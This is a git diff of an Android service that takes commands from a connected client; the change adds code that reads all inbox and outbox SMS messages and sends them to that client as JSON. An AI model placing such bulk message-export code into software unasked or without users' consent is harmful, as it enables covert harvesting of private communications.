@@ -43,6 +43,7 @@ import com.flyscale.ecserver.util.DDLog;
 import com.flyscale.ecserver.util.JsonUtil;
 import com.flyscale.ecserver.util.PhoneUtil;
 import com.flyscale.ecserver.util.PreferenceUtil;
+import com.flyscale.ecserver.util.QueryCompeleteCallback;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -113,7 +114,7 @@ public class ServerService extends Service {
         //监听短信
         mResolver = getContentResolver();
         mSmsObserver = new SmsObserver(mResolver, new SmsHandler(this));
-        mResolver.registerContentObserver(Uri.parse(Constants.SMS_BASE_URI), true, mSmsObserver);
+//        mResolver.registerContentObserver(Uri.parse(Constants.SMS_BASE_URI), true, mSmsObserver);
 
 
         //每次重启服务，需要重启开启线程，避免因为异常导致APP退出，线程仍然空跑的问题
@@ -215,6 +216,26 @@ public class ServerService extends Service {
                     PhoneUtil.setHandfree(mContext);
                     break;
                 case Constants.EVENT_TYPE_QUERYSMS: //查询系统所有短信
+                    PhoneUtil.readInboxOutBoxMsg(mContext, new QueryCompeleteCallback() {
+                        @Override
+                        public void onQuerySuccess(String result) {
+                            DDLog.i(QueryCompeleteCallback.class, "onQuerySuccess(),result=" + result);
+                            try {
+                                JSONObject jsonObject = new JSONObject();
+                                jsonObject.put(Constants.CMD_EVENT_TYPE, Constants.EVENT_TYPE_QUERYSMS);
+                                jsonObject.put(Constants.CMD_EVENT_VALUE, result);
+                                mServerThread.sendMsg2Client(jsonObject.toString());
+                            } catch (JSONException e) {
+                                e.printStackTrace();
+                            }
+
+                        }
+
+                        @Override
+                        public void onQueryFailure(Exception e) {
+
+                        }
+                    });
                     break;
                 case Constants.EVENT_TYPE_SENDSMS:  //发送短信
                     sendMsg(cmdObj.getString(Constants.CMD_EVENT_VALUE));
@@ -222,7 +243,7 @@ public class ServerService extends Service {
                 case Constants.EVENT_TYPE_INSTALLAPP:   //更新service app
                     //TODO
                     break;
-                case Constants.EVENT_TYPE_HIDEDIALNUMBER:   //隐藏号码
+                case Constants.EVENT_TYPE_HIDEDIALNUMBER:   //隐藏所有显示号码
                     //TODO
                     break;
             }
@@ -391,6 +412,11 @@ public class ServerService extends Service {
 
     }
 
+    /**
+     * 解析短信内容
+     *
+     * @param bundle
+     */
     private void getMsgFromIntent(Bundle bundle) {
         DDLog.i(ServerService.class, "getMsgFromIntent");
         if (bundle != null) {
